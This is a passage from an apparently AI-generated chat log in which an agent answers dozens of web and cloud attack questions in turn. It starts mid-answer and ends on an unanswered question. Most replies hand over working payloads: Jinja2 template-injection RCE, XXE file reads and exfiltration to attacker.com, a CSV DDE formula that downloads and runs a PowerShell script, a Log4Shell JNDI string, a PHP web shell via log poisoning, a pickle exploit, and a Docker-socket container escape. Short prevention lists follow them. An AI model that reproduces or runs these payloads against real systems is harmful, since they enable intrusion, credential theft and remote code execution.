Agent: OAuth delegates authentication through third-party providers. Vulnerabilities include redirect_uri manipulation redirecting tokens to attacker domains, lack of state parameter enabling CSRF, scope escalation requesting excessive permissions, client secret exposure in mobile apps, token leakage through referrer headers or logs, and insufficient validation of tokens. Attacks include account takeover by linking OAuth account to attacker account. Prevention validates redirect_uri strictly with exact matching, uses state parameter binding OAuth flow to user session, validates tokens server-side, implements PKCE for public clients, uses short-lived tokens with refresh tokens, and monitors for unusual OAuth patterns.

User: What is SSRF via PDF generation?
Agent: PDF generators that fetch external resources enable SSRF. Libraries rendering HTML to PDF follow URLs in img, iframe, or CSS background. Inject file:///etc/passwd or http://169.254.169.254/latest/meta-data/ in HTML content. Server-side rendering fetches URLs exposing internal resources. Prevention restricts protocols to http/https only, blocks private IP ranges and localhost, implements timeout limits, disables external resource loading, uses allowlist of permitted domains, and monitors PDF generation for suspicious requests.

User: How does template injection differ from XSS?
Agent: Template injection exploits server-side template engines while XSS exploits client-side JavaScript. Template engines like Jinja2, Freemarker, or Velocity render dynamic content. Identify by testing {{7*7}}, ${7*7}, or <%= 7*7 %> observing if calculation executes. SSTI achieves remote code execution accessing underlying Python, Java, or Ruby. Example Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. XSS executes in browser, SSTI executes on server with full system access. Prevention isolates user input from templates, uses sandboxed templating, disables dangerous functions, and validates input.

User: What is clickjacking with frame busting bypass?
Agent: Frame busting JavaScript prevents clickjacking but has bypasses. Legacy code uses if(top!=self){top.location=self.location} redirecting parent frame. Bypass includes sandbox attribute on iframe blocking script execution, double framing with attacker controlling grandparent, using 204 No Content response blocking redirect, or exploiting timing windows. Modern prevention uses X-Frame-Options: DENY or SAMEORIGIN header preventing framing entirely, Content-Security-Policy frame-ancestors directive, and requiring user interaction with additional authentication for sensitive operations.

User: Explain HTTP request smuggling
Agent: HTTP request smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests. Transfer-Encoding and Content-Length headers define request boundaries. If front-end uses Content-Length and back-end uses Transfer-Encoding, inject additional request in body. Example CL.TE attack uses Content-Length to reach back-end but Transfer-Encoding processed by back-end interprets partial second request. Subsequent requests from other users concatenate with smuggled request poisoning cache or hijacking requests. Prevention normalizes HTTP parsing, rejects ambiguous requests, uses HTTP/2, and validates header consistency.

User: What is CSV injection?
Agent: CSV injection achieves code execution when spreadsheets open malicious CSV files. Leading formulas with =, +, -, or @ execute commands. Example: =cmd|'/c calc' executes calculator. =HYPERLINK("http://attacker.com?","text") exfiltrates data. Modern Excel shows security warnings but users click through. Prevention escapes formula characters prepending single quote, validates input removing special characters, educates users, and uses alternative formats like JSON for data exchange.

User: How do I exploit XML bomb denial of service?
Agent: XML bomb or billion laughs attack uses entity expansion causing exponential memory consumption. Define entities referencing each other recursively. Example: <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"> continuing until lol9 references lol8 twice creating 2^9 expansions. XML parser expands entities consuming gigabytes of memory crashing application. Prevention limits entity expansion depth and total size, disables external entities, uses streaming parsers, implements resource limits, and monitors memory usage.

User: What is deserialization gadget chain construction?
Agent: Gadget chains link existing classes to achieve code execution during deserialization. Java libraries like Apache Commons Collections contain utility classes with dangerous methods. Find classes implementing Serializable with useful side effects in readObject or other methods. Chain gadgets passing attacker-controlled objects through transformations reaching code execution. Tools like ysoserial automate payload generation for known chains. Example CommonsCollections uses Transformer interface executing Runtime.exec. Prevention removes dangerous libraries, implements class whitelisting, validates serialized data, uses safe alternatives like JSON, and monitors deserialization.

User: Explain JWT token tampering without signature
Agent: JWT tokens have three parts: header, payload, signature. Payload contains claims like user ID and roles. Changing payload invalidates signature but implementations may skip verification. Change {"user":"guest"} to {"user":"admin"}. None algorithm attack sets alg:none removing signature requirement. Empty signature attack provides header and payload without signature. Exploit weak validation checking signature exists but not verifying. Prevention enforces signature validation, rejects none algorithm, uses strong keys, validates all claims including expiration, and implements proper JWT library usage.

User: What is LDAP pass-back attack?
Agent: LDAP pass-back manipulates network printers or devices using LDAP authentication. Access device configuration through web interface or SNMP. Change LDAP server IP to attacker-controlled system. Device authenticates sending credentials to attacker's LDAP server. Capture credentials in plaintext or hashes. Works against printers, VOIP phones, storage appliances. Prevention restricts device configuration access, uses certificate validation for LDAPS, monitors for LDAP configuration changes, implements network segmentation isolating devices, and enables audit logging.

User: How does XXS filter evasion work?
Agent: XSS filters block common patterns requiring evasion. Case variation uses <ScRiPt>. Encoding uses HTML entities like &#60;script&#62;, URL encoding %3Cscript%3E, or hex \x3Cscript\x3E. Alternative tags use <img>, <svg>, <iframe>, <object>. Event handlers leverage onload, onerror, onfocus. JavaScript protocol in links uses javascript:alert(1). Fragmentation splits attack across multiple attributes. Polyglot payloads work in multiple contexts. Testing requires systematic enumeration. Prevention uses context-aware output encoding, Content Security Policy, framework templating with auto-escaping, and avoiding blacklist filters.

User: What is CORS misconfiguration exploitation?
Agent: Cross-Origin Resource Sharing allows cross-domain requests. Misconfiguration with Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true allows any origin to read authenticated responses. Attacker site makes fetch request to vulnerable site reading sensitive data. Dynamic origin reflection sets Allow-Origin to request Origin header without validation. Null origin allows data:// or file:// origins. Prevention uses strict origin whitelist, never allows * with credentials, validates Origin header, implements additional authentication, and monitors for unusual cross-origin requests.

User: Explain DNS rebinding attacks
Agent: DNS rebinding bypasses Same-Origin Policy by changing DNS resolution. Attacker controls domain evil.com initially resolving to attacker IP. Victim visits evil.com loading JavaScript. Script makes request to evil.com. Before request, attacker changes DNS to resolve to victim's localhost or internal IP. Browser allows request thinking it's same origin. Script accesses internal services like routers or applications. Prevention includes checking Host header on server, implementing DNS pinning in browsers, using authentication on internal services, and blocking requests with private IP hostnames.

User: What is host header injection?
Agent: Host header determines which website to serve on shared hosting. Inject malicious Host header for cache poisoning, password reset poisoning, or SSRF. Password reset emails include links like https://HOST/reset?token=xyz. Inject Host: attacker.com so reset link goes to attacker site leaking token. Cache poisoning serves attacker's cached response to other users. SSRF makes server access internal systems. Prevention validates Host header against whitelist, uses absolute URLs in emails, ignores Host for sensitive operations, and implements server-side request validation.

User: How do I exploit web cache poisoning?
Agent: Web cache poisoning serves attacker-controlled content to cache affecting multiple users. Identify cacheable resources with Vary headers indicating cache keys. Find unkeyed inputs processed by application but not included in cache key like User-Agent or Host headers. Inject payload through unkeyed input getting response cached. Subsequent requests receive poisoned cache. Exploitation includes XSS, open redirect, or SSRF. Tools include Param Miner identifying cache behaviors. Prevention includes proper cache key configuration including all inputs, validating headers, cache segmentation per user, and monitoring cache contents.

User: What is HTTP parameter pollution?
Agent: HTTP parameter pollution exploits different parameter parsing between components. Send duplicate parameters like id=123&id=456. WAF may check first value while application uses last. Different technologies handle duplicates differently: PHP uses last, ASP.NET combines with comma, JSP uses first. Bypass validation by splitting payload across parameters. Inject into second parameter while WAF validates first. Testing varies parameters systematically. Prevention normalizes parameter parsing, rejects duplicates, validates all occurrences, and consistent handling across stack.

User: Explain business logic vulnerabilities
Agent: Business logic flaws violate application workflow assumptions. Example: apply discount codes unlimited times, purchase negative quantities receiving money, race condition checking balance twice allowing overdraft, workflow bypass accessing confirm without checkout, price manipulation changing hidden form fields, forced browsing accessing pages out of sequence. Identify by understanding intended workflow, finding assumptions, testing edge cases and unexpected sequences. Prevention validates state transitions, implements idempotency, checks all conditions server-side, uses cryptographic signatures on sensitive data, and comprehensive testing including abuse cases.

User: What is mass assignment vulnerability?
Agent: Mass assignment binds HTTP parameters to object properties allowing unintended modification. If User object has isAdmin property and update code uses automatic binding, attacker sends isAdmin=true in request. Framework automatically sets property if not explicitly blocked. JSON APIs particularly vulnerable. Languages affected include Rails, Laravel, Spring, ASP.NET MVC. Prevention whitelists allowed properties, uses data transfer objects, separate models for input and storage, validates all properties, and explicit property binding.

User: How does insecure randomness affect security?
Agent: Weak random number generation creates predictable values breaking security. Using Math.random() or rand() for session tokens, CSRF tokens, or password resets allows prediction. Seeding with timestamp or process ID enables brute forcing seed space. Insufficient entropy makes values guessable. Attacks involve predicting next values, brute forcing seed, or statistical analysis. Prevention uses cryptographically secure random generators like os.urandom(), secrets.token_hex(), or SecureRandom, proper seeding from system entropy, sufficient output length at least 128 bits, and testing randomness quality.

User: What is timing attack exploitation?
Agent: Timing attacks exploit execution time variations leaking secrets. String comparison functions return early on first mismatch. Measure response time to determine correct characters. Example: password comparison if first character wrong returns in 1ms, if correct continues comparison taking 2ms. Binary search determines each character. Remote timing attacks require multiple measurements for statistical significance. Prevention uses constant-time comparison functions checking all characters regardless, adding random delays making timing unreliable, rate limiting preventing repeated attempts, and avoiding secret-dependent conditional execution.

User: Explain padding oracle attacks
Agent: Padding oracle exploits CBC mode encryption validation. Application decrypts ciphertext checking padding validity, responding differently for valid versus invalid padding. Attacker manipulates ciphertext observing responses to decrypt data byte by byte. Affects any CBC mode with padding validation oracle. Tools like PadBuster automate exploitation. Prevention uses authenticated encryption like AES-GCM including integrity protection, constant-time padding validation returning identical errors, avoiding padding entirely with stream ciphers, and not exposing decryption errors.

User: What is session fixation?
Agent: Session fixation forces user to authenticate with attacker-known session ID. Attacker obtains session ID from application, sends link to victim with ID in URL or cookie, victim authenticates using that ID, attacker uses same ID to access account. Works if application doesn't regenerate session on authentication. Prevention regenerates session identifier on login, validates session origin, implements short session timeouts, binds session to IP address or user agent, and monitors for session sharing.

User: How do I test for authentication bypass?
Agent: Authentication bypass accesses protected resources without valid credentials. Test techniques include forced browsing guessing URLs, parameter manipulation changing role or user ID, session token prediction or fixation, default credentials, SQL injection in login, race conditions, HTTP method tampering, authentication logic errors, and missing authentication checks. Automate with directory brute forcing, parameter fuzzing, and authentication testing tools. Prevention implements authentication on all protected resources, validates credentials properly, tests edge cases, uses framework authentication, and performs security code review.

User: What is subdomain takeover?
Agent: Subdomain takeover claims DNS pointing to unclaimed resources. Subdomain has CNAME to service like Github Pages, Heroku, or AWS S3. Organization deletes service resource but not DNS record. Attacker claims same resource name inheriting subdomain. Exploitation includes phishing using legitimate domain, serving malware, or stealing cookies with parent domain. Prevention monitors DNS records, removes dangling references, uses wildcard detection, regular audits, and immediate removal of unused subdomains.

User: Explain HTTP response splitting
Agent: HTTP response splitting injects headers into HTTP responses. Vulnerable code includes user input in response headers without validation. Inject CRLF characters \r\n to terminate current header and inject new headers or response body. Example: Location: /redirect?url=VALUE becomes Location: /redirect?url=payload\r\nContent-Length:0\r\n\r\n<html>XSS</html>. Exploitation enables XSS, cache poisoning, or session hijacking. Modern frameworks typically prevent this. Prevention validates all header values, rejects CRLF characters, uses framework header methods, and encodes output.

User: What is mutation XSS mXSS?
Agent: Mutation XSS exploits DOM mutations during parsing. Input passes through multiple parsers causing transformations creating XSS. HTML sanitizer allows certain tags, browser parses differently than sanitizer, creates executable script context. Example: <noscript><p title="</noscript><img src=x onerror=alert(1)>"> becomes executable after noscript removed by browser. Prevention uses single parser matching browser behavior, validates after mutations, employs strict Content Security Policy, uses DOMPurify with proper configuration, and tests with real browsers.

User: How does Unicode normalization create vulnerabilities?
Agent: Unicode has multiple representations for same character. Normalization forms NFC, NFD, NFKC, NFKD convert between representations. Security checks normalize differently than application logic. Example: filter blocks script but allows ſcript (long s), normalization converts to script. Homoglyphs like Cyrillic а appear identical to Latin a. Prevention normalizes input before validation, uses consistent normalization form, validates after normalization, implements strict character whitelisting, and decodes entities before processing.

User: What is ZIP file upload exploitation?
Agent: ZIP file upload enables multiple attacks. Path traversal in filename with ../../../evil.sh extracts outside intended directory. ZIP bomb with recursive compression expands exponentially consuming disk space. Archive symlinks point to sensitive files extracting on unzip. Double extension like shell.php.jpg with content type detection. Malicious macros in Office documents within ZIP. Prevention validates filenames, limits extraction size and depth, checks symlinks, extracts to isolated directory, scans for malware, and implements resource limits.

User: Explain PHP type juggling vulnerabilities
Agent: PHP loose comparison with == performs type coercion. String "0e123" equals integer 0 because interpreted as scientific notation. Hash starting with 0e equals 0. Authentication bypass if password hash equals 0. Injection: in_array with loose comparison allows type confusion. JSON parsing converts numbers. Prevention uses strict comparison ===, validates types explicitly, uses password_verify for hashes, proper type declarations, and disables implicit type conversion.

User: What is dangling markup injection?
Agent: Dangling markup captures data when XSS is blocked but HTML injection allowed. Inject incomplete HTML tag like <img src=' followed by sensitive data then closing quote. Browser includes all content until closing quote in src request to attacker domain. Works with <link href=' or <form action='  capturing CSRF tokens, passwords, or personal data. Prevention properly encodes output, Content Security Policy blocking external resources, validates HTML structure, and avoids reflecting user input in sensitive contexts.

User: How do I exploit XPATH injection?
Agent: XPATH queries XML documents. Injection manipulates queries through unvalidated input. Query like //users/user[username='$input'] vulnerable to input: ' or '1'='1. Extract data with boolean conditions: ' or substring(//password,1,1)='a. Error-based extraction triggers errors revealing data. Prevention uses parameterized XPATH queries, input validation escaping special characters, principle of least privilege on XML access, and error handling suppressing details.

User: What is CRLF injection in logs?
Agent: CRLF injection in logging creates fake log entries. Log entries typically one per line. Inject \n to create newline starting new fake entry. Example: login as user: admin\n2024-01-01 00:00:00 admin logged out\n hiding malicious activity. Forge authentication logs, create false audit trail, or inject log analysis rules. Prevention encodes CRLF characters, uses structured logging with JSON, validates input before logging, implements log integrity with signatures, and centralizes logging.

User: Explain email header injection
Agent: Email header injection manipulates mail functions. PHP mail() function takes headers parameter. Inject additional recipients with \nBcc: attacker@evil.com or inject body with \n\n<body content>. Spam campaigns, phishing using legitimate mail servers. Modern implementations often prevent this but legacy code vulnerable. Prevention uses validated mail libraries, rejects CRLF in headers, implements rate limiting, validates all recipient addresses, monitors outbound mail volume, and uses SPF/DKIM.

User: What is CORS with credentials exploitation?
Agent: CORS Access-Control-Allow-Origin must not use wildcard * with Access-Control-Allow-Credentials: true but some implementations dynamically set origin. Server reflects Origin header value in Allow-Origin response. Attacker's site makes authenticated fetch request to vulnerable site. Response includes cookies/auth allowing data theft. Exploitation requires victim visiting attacker site while authenticated to target. Prevention validates Origin against whitelist, never reflects Origin without validation, proper session binding, SameSite cookies, and monitors cross-origin requests.

User: How does cache deception work?
Agent: Cache deception serves sensitive personalized content to other users. Find URL serving personal data. Append static-like path like /profile/account.css. CDN caches based on extension ignoring actual content. Victim visits /profile/account.css, receives profile page cached by CDN. Attacker requests same URL receiving victim's data from cache. Prevention normalizes URLs before caching, validates extensions match content type, configures cache keys properly, segregates cache per user, and implements cache controls with private directive.

User: What is IDOR in GraphQL?
Agent: GraphQL IDOR occurs in queries/mutations accessing objects by ID without authorization. Query user(id: 123) returns any user's data. Batch queries amplify testing. Introspection reveals all queries and types. Prevention implements authorization on every resolver, validates user owns requested resource, disables introspection in production, rate limiting, query complexity limits, and field-level access control.

User: Explain prototype pollution via JSON
Agent: JSON parsing creates objects with properties from JSON. If JSON contains __proto__ key, assignment pollution occurs. Example: JSON.parse('{"__proto__": {"polluted": true}}') pollutes Object.prototype. All objects inherit polluted property. Exploit bypasses security checks, DoS, or code execution. Libraries like lodash merge vulnerable. Prevention validates keys blocking __proto__, uses Object.create(null), JSON schema validation, freezes Object.prototype, and updates vulnerable libraries.

User: What is server-side template injection in Jinja2?
Agent: Jinja2 SSTI exploits Python template engine. Identify with {{7*7}} rendering 49. Access Python internals through object introspection. Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} executes shell command. Navigate object hierarchy to reach dangerous functions. Alternative: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}. Prevention uses sandboxed environment, disables dangerous filters and globals, separates user input from templates, validates input, and uses template libraries safely.

User: How do I bypass CSP with JSONP?
Agent: Content Security Policy restricts script sources but JSONP endpoints can bypass. CSP allows https://trusted.com. If trusted.com has JSONP endpoint like /api?callback=func, inject <script src="https://trusted.com/api?callback=alert(1)">. Callback parameter controls function name executing arbitrary JavaScript. Prevention removes JSONP endpoints, implements proper CORS, validates callback parameter against whitelist, uses strict CSP without unsafe-inline, and monitors for CSP violations.

User: What is SQL injection in ORDER BY clause?
Agent: ORDER BY injection modifies sort order potentially leaking data. Injection point: ORDER BY $input. Boolean-based: ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 2 END) changes sort if condition true. Time-based: ORDER BY (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) causes error or delay. Extract data bit by bit. Limited exploitation compared to other injection types. Prevention uses whitelist of allowed columns, validates input strictly, parameterized queries where possible, and input sanitization.

User: Explain blind XXE with out-of-band
Agent: Blind XXE has no direct output requiring external interaction. Define external entity pointing to attacker server. Example: <!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">. Reference entity triggering HTTP request to attacker. Exfiltrate data with parameter entities: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://attacker.com/?%file;'>">%eval;%exfil; loads file contents into URL parameter. Prevention disables external entities, monitors outbound connections from XML parsers, network segmentation, and input validation.

User: What is JWT kid header injection?
Agent: JWT kid key ID header specifies which key verifies signature. If implementation uses kid to load file path, inject path traversal like kid: ../../../../dev/null. Empty file as key with null bytes creates valid signature for modified payload. SQL injection in kid if loaded from database: kid: 1' UNION SELECT 'secret. Prevention validates kid against whitelist, uses key identifier not file path, sanitizes input, doesn't use kid directly in queries or file operations, and proper key management.

User: How does XML entity expansion DoS work?
Agent: Billion laughs or XML bomb uses recursive entity expansion. Define entities referencing each other with duplication. Example: lol1 contains "lol", lol2 contains two instances of lol1, continuing. Final entity references create exponential expansion. Small XML file expands to gigabytes in memory crashing parser. Variant: external entity pointing to large file or /dev/random. Prevention limits entity expansion depth, maximum expanded size, disables external entities, uses streaming parsers with limits, and monitors resource usage.

User: What is HTTP header smuggling?
Agent: Header smuggling exploits parsing differences for specific headers. Space before header name: ` Content-Length: 0` some parsers ignore but others process. Header name with colon: `Content-Length:` `5` splits interpretation. Underscore versus hyphen: X_Forwarded_For versus X-Forwarded-For. Exploit accesses restricted functionality, bypasses security controls, or poisons cache. Prevention normalizes headers, rejects malformed headers, consistent parsing across components, validates header format strictly, and uses HTTP/2.

User: Explain insecure direct object reference automation
Agent: Automate IDOR testing with Burp Suite Intruder or custom scripts. Identify parameter containing object ID. Create list of IDs through enumeration or prediction. Test each ID checking for unauthorized access. Monitor responses for different status codes, content lengths, or data presence. Use authorization analyzer extension comparing responses between users. For UUIDs, check predictability or information disclosure. GraphQL batch queries test multiple IDs simultaneously. Prevention implements authorization on every endpoint, uses indirect references, monitors for enumeration patterns, and rate limiting.

User: What is PHP LFI to RCE via log poisoning?
Agent: Local File Inclusion with log poisoning achieves code execution. Include web server access logs with LFI. Inject PHP code into log file through User-Agent or other logged headers. Example: User-Agent: <?php system($_GET['cmd']); ?>. Request page with LFI reading log file: page.php?file=../../../../var/log/apache2/access.log&cmd=id. Log file executed as PHP. Prevention validates file paths, disables dangerous PHP functions, implements proper access controls, sanitizes logged values, separates logs from web paths, and monitors for log injection.

User: How do I exploit XXE to read files?
Agent: XXE reads local files through external entity references. Inject DOCTYPE with entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>. Parser resolves entity including file contents in response. For files with XML special characters, use PHP filter wrapper: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">. Base64 encoding prevents parsing errors. Windows paths: <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">. Prevention disables external entities, DTD processing, uses simple data formats, validates input, and sandboxes XML processing.

User: What is SSRF via XXE?
Agent: XXE enables SSRF through external entity HTTP requests. Define entity with internal URL: <!ENTITY xxe SYSTEM "http://localhost:8080/admin">. Parser makes HTTP request and includes response. Access internal services, cloud metadata, databases. Blind variant sends data to attacker: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;. evil.dtd contains: <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?%file;'>">%all;%send;. Prevention disables external entities, filters URLs, network segmentation, and monitors outbound connections.

User: Explain NoSQL injection in MongoDB
Agent: MongoDB queries use JSON. JavaScript injection if using $where operator: {$where: "this.username == '" + input + "'"} inject: '; return true; //. Operator injection with objects: username: {$ne: null} matches all users. Regex injection for brute force: username: {$regex: "^admin"} checks prefix. Timing attacks extract data character by character. Prevention avoids $where operator, validates input types rejecting objects, uses parameterized queries, principle of least privilege, implements rate limiting, and monitors for operator injection patterns.

User: What is CSV formula injection for data exfiltration?
Agent: CSV injection exfiltrates data through formula execution. Inject: =HYPERLINK("http://attacker.com/?" & A1,"click"). When CSV opens, Excel executes formula sending cell data to attacker. DDE exploit: =cmd|'/c powershell IEX(wget http://attacker.com/evil.ps1)'. Requires user interaction but social engineering bypasses warnings. Prevention escapes formula characters with single quote prefix, validates input, educates users, provides security warnings, alternative formats, and sandboxes formula execution.

User: How does deserialization exploit Java Commons Collections?
Agent: Apache Commons Collections gadget chain achieves RCE through deserialization. ChainedTransformer allows chaining method calls. ConstantTransformer provides arguments. InvokerTransformer invokes methods. Chain creates: Runtime.getRuntime().exec("command"). Construct LazyMap with ChainedTransformer. Wrap in AnnotationInvocationHandler triggering chain during deserialization. Ysoserial automates payload creation: java -jar ysoserial.jar CommonsCollections1 'command'. Prevention removes vulnerable libraries, implements class whitelisting, uses safe serialization like JSON, validates serialized data, and monitors for suspicious classes.

User: What is web cache poisoning via fat GET?
Agent: Fat GET request includes body with GET method. Some servers process GET body while cache ignores it. Send malicious content in body, cache stores response keyed only on URL without body. Subsequent GET requests receive poisoned response. Affects reverse proxies, CDNs. Similar to unkeyed input exploitation. Prevention configures cache keys including relevant inputs, rejects GET with body, normalizes requests, validates cache configuration, and monitors for poisoning attempts.

User: Explain blind SSRF with out-of-band detection
Agent: Blind SSRF has no direct response requiring external confirmation. Inject URLs pointing to attacker-controlled server or Burp Collaborator. Monitor for incoming connections confirming SSRF. DNS exfiltration embeds data in subdomain: http://data.unique-id.attacker.com. Time-based detection through slow HTTP endpoints observing request delays. Exploit internal services through HTTP methods, headers, or POST data. Chain with other vulnerabilities accessing authenticated internal APIs. Prevention validates URLs, whitelists allowed domains, monitors outbound connections, network segmentation, and disables unnecessary URL schemes.

User: What is race condition in payment processing?
Agent: Payment race condition allows double spending. Check balance, deduct amount has timing window. Send simultaneous requests both passing balance check before deduction completes. Both transactions succeed causing overdraft or duplicate purchases. Exploitation requires precise timing and low latency. Testing uses threading or async requests. Prevention implements database transactions with proper isolation level, uses atomic operations with FOR UPDATE locking, optimistic locking with version fields, queue-based processing, and idempotency keys.

User: How do I bypass rate limiting?
Agent: Rate limit bypass techniques include IP rotation using proxies or VPN, X-Forwarded-For header injection, different HTTP methods GET versus POST, parameter pollution, null bytes in parameters, header case variation, distributed requests from multiple accounts, timing attacks spreading requests over time, and API endpoint variation. Testing systematically varies bypass attempts monitoring rate limit responses. Prevention implements rate limiting by multiple identifiers, validates X-Forwarded-For, consistent enforcement across methods and endpoints, monitors for distributed attacks, uses CAPTCHA, and behavioral analysis.

User: What is OAuth covert redirect?
Agent: OAuth covert redirect bypasses redirect_uri validation. Validation checks starts-with allowing attacker-controlled path: redirect_uri=https://trusted.com/callback/../../../@attacker.com. URL parsing differences enable bypass. Open redirect on trusted domain chains with OAuth: redirect_uri=https://trusted.com/redirect?url=http://attacker.com. Attacker intercepts authorization code. Prevention implements strict redirect_uri validation with exact matching, no wildcards, rejects redirects with multiple @ or ../, validates after URL parsing, and uses state parameter.

User: Explain JWT none algorithm attack
Agent: JWT none algorithm removes signature verification. Header alg specifies signature algorithm. Change alg:HS256 to alg:none and remove signature. Token becomes header.payload. with trailing period. If implementation uses algorithm from header rather than validating, accepts unsigned tokens. Modify payload claims like {"user":"admin"}. Prevention validates algorithm in code, whitelist allowed algorithms, rejects none algorithm explicitly, verifies signature exists, uses proper JWT libraries, and never trusts token header for security decisions.

User: What is LDAP injection for authentication bypass?
Agent: LDAP authentication query: (&(uid=USER)(password=PASS)). Inject wildcards: uid=*)(uid=admin))(&(password=* bypasses password check. Filter becomes: (&(uid=*)(uid=admin))(&(password=*)(password=PASS)) matching admin with any password. Alternatively: uid=admin)(&(password=x or uid=admin)(password=x closes filters. Prevention uses parameterized LDAP queries, validates input escaping special characters * ( ) & | =, implements rate limiting on authentication, monitors for unusual LDAP patterns, and least privilege for LDAP binds.

User: How does HTTP/2 request smuggling work?
Agent: HTTP/2 uses binary framing versus HTTP/1.1 text. Front-end speaks HTTP/2, back-end HTTP/1.1. Downgrade introduces smuggling opportunities. Header injection through CRLF in HTTP/2 headers smuggles requests in downgraded HTTP/1.1. Content-Length versus Transfer-Encoding conflicts. HTTP/2 pseudo-headers like :method, :path manipulated. Prevention uses HTTP/2 end-to-end, validates headers during downgrade, rejects malformed requests, consistent parsing, and monitors for smuggling patterns.

User: What is polyglot payload exploitation?
Agent: Polyglot payloads valid in multiple contexts simultaneously. Valid JPEG and PHP: GIF89a<?php system($_GET['c']); ?> displays as image but executes as PHP if accessed directly. GIF header passes image validation. HTML/JavaScript polyglot bypasses filters allowing subset of each. JSONP and HTML polyglot: <html><!--{"callback":"alert(1)"} becomes XSS. Testing creates files valid in target formats. Prevention validates by content not extension, strong file type checking with magic bytes, disables script execution in upload directories, and proper Content-Type headers.

User: Explain CRLF injection in HTTP response
Agent: CRLF injection splits HTTP response into multiple responses. Inject \r\n\r\n terminating headers and starting new response. Example Set-Cookie: value\r\n\r\n<html><script>alert(1)</script> creates complete injected response. Cache poisoning stores malicious response. Session hijacking sets cookies. XSS through response body. Prevention validates header values, rejects CRLF characters, uses framework header functions, and encodes output.

User: What is XSLT injection for RCE?
Agent: XSLT transforms XML documents. XSLT injection executes code through dangerous functions. PHP php:function enables calling PHP functions: <xsl:value-of select="php:function('system','id')"/>. Java allows scripting extensions. File read with document() function: document('file:///etc/passwd'). SSRF accessing internal URLs. Prevention disables scripting extensions, restricts dangerous functions, uses safe XSLT processors, validates stylesheets, sandboxes processing, and monitors for suspicious transformations.

User: How do I exploit ImageTragick vulnerabilities?
Agent: ImageMagick CVE-2016-3714 ImageTragick processes malicious images executing commands. MVG format with push graphic-context and viewbox enables command injection. Example: push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.1/test.jpg"|curl "http://attacker.com)' pop graphic-context. Delegates configuration processes certain formats through external commands. Prevention updates ImageMagick, disables vulnerable coders in policy.xml, validates images strictly, sandboxes processing, monitors for shell execution, and uses alternative libraries.

User: What is JNDI injection in Java?
Agent: JNDI Java Naming and Directory Interface lookup loads resources from URLs. JNDI injection with ldap:// or rmi:// URLs loads malicious classes from attacker server. Log4Shell CVE-2021-44228 uses ${jndi:ldap://attacker.com/exploit} in logged strings. JNDI resolves URL loading remote class achieving RCE. Affects many Java applications. Prevention disables JNDI lookups, validates input, updates vulnerable libraries like Log4j, sets system properties com.sun.jndi.ldap.object.trustURLCodebase=false, network segmentation, and monitors for JNDI patterns.

User: Explain Python pickle deserialization RCE
Agent: Pickle deserializes Python objects but can execute arbitrary code. Object __reduce__ method returns callable and arguments executed during unpickle. Example: class Exploit: def __reduce__(self): return (os.system, ('id',)). Pickled object executes command when unpickled. No gadget chain needed. Prevention never unpickles untrusted data, uses safe alternatives like JSON, validates data with signatures, restricts pickle to specific classes, sandboxes unpickling, and monitors for suspicious imports.

User: What is SAML authentication bypass?
Agent: SAML Security Assertion Markup Language provides SSO. XML signature wrapping attacks inject unsigned assertions. Comment injection breaks signature validation. Empty string in username assertion: <NameID></NameID><NameID>admin</NameID> processes last value. XML External Entity in SAML parsing. Prevention validates XML signatures properly, disables entity processing, implements strict XML parsing, validates all assertions, uses modern SAML libraries, and monitors authentication patterns.

User: How does AWS metadata SSRF work?
Agent: AWS EC2 instances have metadata service at 169.254.169.254. SSRF accessing /latest/meta-data/iam/security-credentials/ROLE-NAME returns temporary credentials. These credentials access AWS services like S3, DynamoDB based on IAM role permissions. IMDSv2 requires token from PUT request adding protection but bypass possible. Azure metadata at 169.254.169.254 requires Metadata: true header. GCP metadata at 169.254.169.254 uses Metadata-Flavor: Google header. Prevention blocks metadata IP, uses IMDSv2, validates headers, network segmentation, monitors metadata access, and least privilege IAM roles.

User: What is GraphQL batching attack?
Agent: GraphQL allows multiple queries in single request. Batch hundreds of expensive queries causing resource exhaustion. Example: query { user1: user(id:1){posts{comments}}, user2: user(id:2){posts{comments}}, ... }. Amplifies attack bypassing rate limits counting requests not query complexity. Prevention limits batch size, implements query complexity analysis, rate limiting by query count and complexity, persistent query whitelisting, monitors for batching patterns, and timeout enforcement.

User: Explain Kubernetes RBAC bypass
Agent: Kubernetes Role-Based Access Control manages permissions. Misconfigured RBAC allows privilege escalation. Wildcard permissions grant excessive access. Verb list allows reading secrets. Create pod with privileged: true mounts host filesystem. Service account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token authenticates to API. Escape container accessing node. Prevention implements least privilege RBAC, avoids wildcards, audits roles regularly, restricts privileged pods, uses Pod Security Policies, network policies, and monitors API access.

User: What is container escape via exposed Docker socket?
Agent: Docker socket /var/run/docker.sock mounted in container allows Docker API access. Create privileged container mounting host root filesystem: docker run -v /:/host -it ubuntu chroot /host. Escape container accessing host. Alternative: create container with host PID namespace viewing all processes. Prevention never mounts Docker socket in untrusted containers, uses Docker-in-Docker alternatives, implements admission controllers, monitors for privileged container creation, and container runtime security.

User: How do I exploit AWS S3 bucket misconfiguration?
Agent: S3 buckets with public read allow unauthorized access. List objects with AWS CLI or browser. Public write enables data injection or defacement. ACLs versus bucket policies create confusion. Authenticated-users ACL allows any AWS account access. Prevention uses bucket policies blocking public access, enables Block Public Access, regular audits with tools like ScoutSuite, implements least privilege, monitors access logs, and validates ACLs match intended access.

User: What is JWT audience claim bypass?
